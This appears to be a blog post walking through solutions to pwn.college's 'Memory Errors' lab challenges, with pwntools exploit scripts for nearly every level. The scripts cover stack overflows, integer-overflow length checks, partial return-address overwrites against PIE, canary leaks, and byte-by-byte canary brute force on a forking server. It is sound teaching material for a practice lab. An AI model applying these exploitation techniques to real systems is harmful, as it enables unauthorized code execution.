---
layout: post
title:  "Pwn College - Memory Errors"
date:   2024-04-26 19:59:49 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module teaches basics of stack overflow exploitation, adding mitigations and restrictions as challenges proceeds. 


## Challenge 1

Just insert 69 bytes.

## Challenge 2

```python
from pwn import *
import os, sys
import struct

p = process("/challenge/babymem_level2.0")

buf = b'A' * 48 + struct.pack('<I', 0x0385132d)
p.sendline(str(len(buf)))
p.send(buf)

p.interactive()
```

## Challenge 3

Overwrite the return address:

```python
from pwn import *
import os, sys
import struct

p = process("/challenge/babymem_level3.0")

buf = b'A' * 88 + struct.pack('<I', 0x40236c)
p.sendline(str(len(buf)))
p.send(buf)

p.interactive()
```

## Challenge 4

Now theres a check that we do not overflow the buffer size. However, there's an integer overflow vuln within the comparison. \
Hence, we can set the buffer length to huge `0xffffffff`, yet interpret as being -1 and pass the check:

```python
from pwn import *
import os, sys
import struct

p = process("/challenge/babymem_level4.0")

buf = b'A' * 72 + struct.pack('<Q', 0x40203f)
p.sendline('4294967295')
p.send(buf)

p.interactive()
```

## Challenge 5

Theres integer overflow vuln with the calculation of `record_num * record_size`, hence we want to wrap around this value.

```python
from pwn import *
import os, sys
import struct

p = process("/challenge/babymem_level5.0")

buf = b'A' * 72 + struct.pack('<Q', 0x402471)
p.sendline('2')
p.sendline('2147483648')
p.send(buf)

p.interactive()
```

## Challenge 6

Now the goal method have a check we have to pass. \
In order to pass this, just jump to address after the check is performed. 

## Challenge 7

Now its a PIE binary with ASLR, and we have no leak primitive. \
The trick is to overwrite only 2 LSBs. 

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/babymem_level7.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']
addr_win = elf.symbols['win_authed']

p = process(BINARY)
buf = b'A' * 56 + struct.pack('<H', 0xbf68)
p.sendline(str(len(buf)))
p.send(buf)

p.interactive()
```

## Challenge 8

This challenge adds an extra copy from the heap, as well as validation using `strlen` (can be found via `ltrace` on the binary). \
We can pass this check by setting a null byte initially within our buffer. 

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/babymem_level8.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']
addr_win = elf.symbols['win_authed']

p = process(BINARY)

buf = b'\x00' + b'A' * 103 + struct.pack('<H', 0xbfd9)
p.sendline(str(len(buf)))
p.send(buf)

p.interactive()
```

## Challenge 9

Now the binary is PIE, there’s a canary and we read 1 byte at a time, something like:

```c
while (n < size) {
      n += read(0, input + n, 1); 
}
```

The local variable `n` is located 100 bytes past the input buffer, while the goal return address is located 120 bytes after it. \
Therefore, by overwriting `n` we would be able to read content into an address we control - and potentially skipping over the canary! Because `n` is incremented by 1 right after the read operation, we would set it to the value of 119 (so that by the end of the loop, it would contain the value of 120). \
Because we would only like to overwrite 2 bytes of the return address, we’d set `size = 122`. 

Moreover, because the binary is PIE and theres a check within the goal method, we’d jump right past the check. 

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/babymem_level9.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']
addr_win = elf.symbols['win_authed']


p = process(BINARY)

padding = b'\x00' + b'A' * 99
new_n_value = b'\x77'  # offset 120 - 1
buf = padding + new_n_value + struct.pack('<H', 0xb611)
p.sendline('122')
p.send(buf)

p.interactive()
```

## Challenge 10

Tricky. 

The flag is loaded into memory, nothing is printed or given. \
The thing is - the flag is loaded to an address right after the input. Hence, in case we won't terminate our 81-byte payload with a null character, the print messages would yield us the flag:

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/babymem_level10.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']

p = process(BINARY)

padding = b'A' * 81
new_n_value = b'\x47'
buf = padding
p.sendline(str(len(buf)))
p.send(buf)

p.interactive()
```

## Challenge 11

Now the program `mmap`s the flag to a dynamic address. \
Thankfully, the input buffer is also mmaped to an address, 0x4000 bytes prior to the flag.

Hence, the same trick of setting 0x4000 non-null characters works. 

## Challenge 12

Canary, PIE, ASLR, simple BOF with no leak. \
However, by writing `REPEAT` we can execute the challenge once again. 

Therefore, I've run a phase to leak the canary, and another phase for the return address overwrite:

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/babymem_level12.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']
addr_win = elf.symbols['win_authed']

p = process(BINARY)

header = b'REPEAT'
buf_1 = header
p.sendline(str(len(buf_1)))
p.send(buf_1)

padding = b'A' * (88 - len(header))
buf_2 = header + padding + b'B'  # The LSB of the canary is always 0x00. Hence, we need to overwrite it in order to see the result. 

p.sendline(str(len(buf_2)))
p.send(buf_2)

while True:
    data = p.recvline()
    if buf_2 in data:
        start_index = data.find(buf_2) + len(buf_2) - 1  # -1 As we also take the fake "B" LSB
        canary = struct.unpack('<Q', data[start_index: start_index + 8])[0] & 0xffffffffffffff00
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Canary value:{hex(canary)}')
        break

buf_3 = b'C' * 88 + struct.pack('<Q', canary) + b'D' * 8 + struct.pack('<H', 0xb3c6)
p.sendline(str(len(buf_3)))
p.send(buf_3)

p.interactive()
```

## Challenge 13

Vuln - uninitialized data. \
`verify_flag` function left its stack frame in non clean state.

Therefore, the flag resides at a constant address within the stack, during the call of challenge - and we can easily leak it by setting a non null-terminated string. 

## Challenge 14

Similar to challenge 12, but this time the print method is limited by `.393%s` delimiter - hence it won’t be able to leak extra canary bytes as in the previous trick.

However, notice the input buffer isn’t initialized to 0. Hence, we may leak some stack values in case we would supply 0-length input. 

At the second stack frame opening, we can see the canary resides within offset of 0x18 bytes - as the input buffer wasn’t initialized to 0, and got junk from the previous calls :)

Hence, by filling only 0x18 bytes, we would be able to leak the canary value.


```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/babymem_level14.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']
addr_win = elf.symbols['win_authed']

p = process(BINARY)

header = b'REPEAT'
buf_1 = header
p.sendline(str(len(buf_1)))
p.send(buf_1)

padding = b'A' * (0x18 - len(header))
buf_2 = header + padding + b'B'  # The LSB of the canary is always 0x00. Hence, we need to overwrite it in order to see the result. 

p.sendline(str(len(buf_2)))
p.send(buf_2)

while True:
    data = p.recvline()
    if buf_2 in data:
        start_index = data.find(buf_2) + len(buf_2) - 1  # -1 As we also take the fake "B" LSB
        print(f'Data is:{data} index:{start_index}')
        canary = struct.unpack('<Q', data[start_index: start_index + 8])[0] & 0xffffffffffffff00
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Canary value:{hex(canary)}')
        break

buf_3 = b'C' * 408 + struct.pack('<Q', canary) + b'D' * 8 + struct.pack('<H', 0xb73a)
p.sendline(str(len(buf_3)))
p.send(buf_3)

p.interactive()
```

## Challenge 15

Server listening on port 1337. We can connect via `nc 0.0.0.0 1337`.

The remote service forks for every new connection, while the parent process never dies. \
Upon forking, the parent canary is used for the child process - hence, it never changes.

Such scenario is perfect to leak the canary in byte-after-byte manner. \
Brute force every canary byte - if the check fails, continue to the next value. Otherwise, continue to the next byte. 

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/babymem_level15.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']
addr_win = elf.symbols['win_authed']

def clear_junk(p):
    p.recvuntil('In this level, there is no "win" variable')
    p.recvuntil("Let's see what happened")
    p.recvuntil("Let's try it now!")
    p.recvuntil("Goodbye!")

def is_correct_byte(p):
    data = p.recvuntil(b'*** stack smashing detected ***', timeout=2)
    print(f'Data:{data}, RESULT:{len(data)==0}')
    return len(data)==0

current_buf = b'A' * 72
while len(current_buf) < 80:
    for num in range(256):
        with remote('0.0.0.0', 1337) as p:
            candidate = current_buf + num.to_bytes(1, 'little')

            p.sendline(str(len(candidate)))
            p.send(candidate)
            clear_junk(p)

            if is_correct_byte(p):
                print(f'NEW BYTE FOUND:{num}')
                current_buf = candidate
                break

print(f'CANARY:{current_buf}')
p = remote('0.0.0.0', 1337)
buf_3 = current_buf + b'D' * 8 + struct.pack('<H', 0x3b8a)
p.sendline(str(len(buf_3)))
p.send(buf_3)

p.interactive()
```

## Archived - Challenge 2 - f2022

Contains heap buffer we may overflow, Just send 449 bytes to overwrite it. 
